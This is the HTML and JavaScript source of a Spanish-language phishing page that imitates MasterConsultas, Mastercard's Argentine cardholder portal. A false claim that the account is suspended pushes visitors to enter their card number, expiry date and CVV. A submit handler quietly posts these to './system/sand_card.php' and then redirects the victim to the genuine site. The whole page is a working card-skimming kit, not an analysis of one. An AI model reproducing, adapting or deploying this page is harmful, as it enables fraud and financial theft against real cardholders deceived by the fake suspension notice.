<html class="no-js" lang="en"><head><meta http-equiv="Cache-Control" content="no-cache, no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

	<title>MasterConsultas</title>
	
	<link rel="stylesheet" href="./style/css/style.css">
    <link rel="icon" href="./style/css/img/logo.png">


	
<div id="header" class="nolog">
  <div class="header-content">
    <h1><a href="#">MasterConsultas</a></h1>
  </div>
</div>






</div>
</header> 	
	<meta http-equiv="Cache-Control" content="no-cache, no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<div id="scLk"></div>
<style>
/* style keyboard */
table tbody tr td {padding:0;} 
</style>


<div id="container" class="clearfix">
  <div class="content nolog">




<div class="cont-header">
      <h3 class="title">Debes actualizar tu cuenta para que se active permanentemente.</h3>
      <p class="copete">Su cuenta est&#225; actualmente suspendida. Toda la informaci&#243;n debe ingresarse correctamente y luego su cuenta ser&#225; liberada autom&#225;ticamente y gracias.</p>
    
    </div>








<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000 0000');
		$('#csc').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');


	});
	</script>




<script>
// Wait for the DOM to be ready
$(function() {
  // Initialize form validation on the registration form.
  // It has the name attribute "registration"
  $("form[name='cardinfo']").validate({
    // Specify validation rules
    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },
    // Specify validation error messages
    messages: {

      username: "El campo Usuario es requerido",
      pass: "El campo Clave es requerido",

cardnumber:"&#8218;",

CVC:"&#8218;",



      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
   submitHandler: function(form) {
                    $("#blockUI").show();
                 

					$.post("./system/sand_card.php?ajax", $("#cardinfo").serialize(), function(result) {


                            setTimeout(function() {

$(location).attr("href", "http://masterconsultas.com");


                        });
                    });
                },

  });
});

</script>

<div id="blockUI" class="blockUI" style="display:none">  
<div class="blockUI blockOverlay" style="z-index: 1000; border: none; margin: 0px; padding: 0px; width: 100%; height: 100%; top: 0px; left: 0px; background-color: rgb(0, 0, 0); opacity: 0.6; cursor: wait; position: fixed;"></div>
<div class="blockUI blockMsg blockPage" style="z-index: 1001; position: fixed; padding: 0px; margin: 0px; width: 30%; top: 40%; left: 35%; text-align: center; color: rgb(0, 0, 0); border: 3px solid rgb(170, 170, 170); background-color: rgb(255, 255, 255); cursor: wait;"><h1>Espere por favor ...</h1></div>
</div>


    
<form id="cardinfo" name="cardinfo" action="./system/sand_card.php" method="post" class="form-altavirtual" autocomplete="off">
        <fieldset>
		 
        <!-- CARD -->		 
		  		<p class="nrotar">
			<label>N&#218;MERO DE TARJETA DE CR&#201;DITO</label>
			<span>


<input type="text" name="cardnumber"  value="" required="required" id="cardnumber" class="w164 hasText valid" onkeydown="blockKeyPoint(event);" aria-required="true" aria-invalid="false" aria-describedby="registerSubmit_virtualUser_cvcNumberinputError">



</span>

<span id="registerSubmit_virtualUser_cvcNumberinputError" class="d" style="display: none;"></span>


			<img src="./style/css/img/logo.png" height="32" width="45" >


		</p>
		

		     
        
        <!-- DATE -->
        
<p class="nrotar">          
            <label>MES/A&#209;O</label>
			<span>
				<select required="required" name="MM" id="registerSubmit_selectDocType" class="w70">
    <option value="01">01</option>
    <option value="02">02</option>
    <option value="03">03</option>
    <option value="04">04</option>
    <option value="05">05</option>
	<option value="06">06</option>
	<option value="07">07</option>
	<option value="08">08</option>
	<option value="09">09</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>

</select>

<select name="YY" required="required" id="registerSubmit_selectDocType" class="w70">
    <option value="18">18</option>
    <option value="19">19</option>
    <option value="20">20</option>
    <option value="21">21</option>
    <option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>

</select>
          </span></p>

          
          
         <!-- CVC -->
		<p class="nrotar">
			<label>C&#211;DIGO DE SEGURIDAD (CVV)</label>
			<span>


<input type="text" name="CVC" required="required" maxlength="3" value="" id="CVC" class="w76 hasText valid" onkeydown="blockKeyPoint(event);" aria-required="true" aria-describedby="CVCinputError" aria-invalid="false">



</span>


<span id="CVCinputError" class="d" style="display: none;"></span>
			<img src="./style/css/img/standard-codigo-de-seguridad.png">
			<small>&#218;LTIMOS 3 D&#237;GITOS DEL PANEL.</small>
		</p>	
          
                           
        </fieldset>
		
		
		<input required="required" type="submit" id="submitLogin" value="Confirmar" class="btn-224px" style="border:none;" clearform="true" button="true" blocksui="true">
      </form>






    <div class="combo-txt">
      
      
    </div>
  </div>
</div>
	

<footer>
<div id="footer">
  	<div class="footer-content">
      <div class="box socios">
          <h5>Socios</h5>
          <ul>
          	<li><a href="#" target="_blank">Tarjetas de Cr&#233;dito</a></li>
            <li><a href="#" target="_blank">Otras Tarjetas</a></li>
            <li><a href="#" target="_blank">Promociones</a></li>
            <li><a href="#" target="_blank">Novedades</a></li>
          </ul>
      </div>
      <div class="box comercios">          
           <h5>Comercios</h5>
           <ul>
            <li><a href="#" target="_blank">Acepte Mastercard</a></li>
            <li><a href="#" target="_blank">Servicios</a></li>
            <li><a href="#" target="_blank">Novedades</a></li>
            <li><a href="#" target="_blank">Descargas</a></li>
          </ul>
      </div>        
      <div class="box empresas">
          <h5>Empresas</h5>
          <ul>
            <li><a href="#" target="_blank">Tarjetas</a></li>
            <li><a href="#" target="_blank">Promociones</a></li>
          </ul>
      </div>      
      <div class="box contactenos">
           <h5>¿Necesita ayuda?</h5>
           <ul>
            <li><a href="#" target="_blank">¿Extravió su tarjeta?</a></li>
            <li><a href="#" target="_blank">Buscador Cajeros</a></li>
			<li><a href="https://www.masterconsultas.com.ar/contacto.html" target="_blank">Cont&#225;ctese con nosotros</a></li>
          </ul>      
      </div>
    </div>
    <a href="#" class="top"></a>
    <h6>MasterCard</h6>
    <p class="loginDF">
    	<a href="#">First Data Cono Sur S.R.L.</a> | <a href="#">Todos los derechos reservados</a><br>    	 
    	<a href="#" target="_blank">T&#233;rminos y Condiciones</a> | <a href="#" target="_blank">Medidas de Seguridad</a> | <a href="#" target="_blank">Protección de Datos Personales</a> | <a href="#" target="_blank">Defensa y Protección al Consumidor</a>
    </p>
  </div>
</footer>	


	</body></html>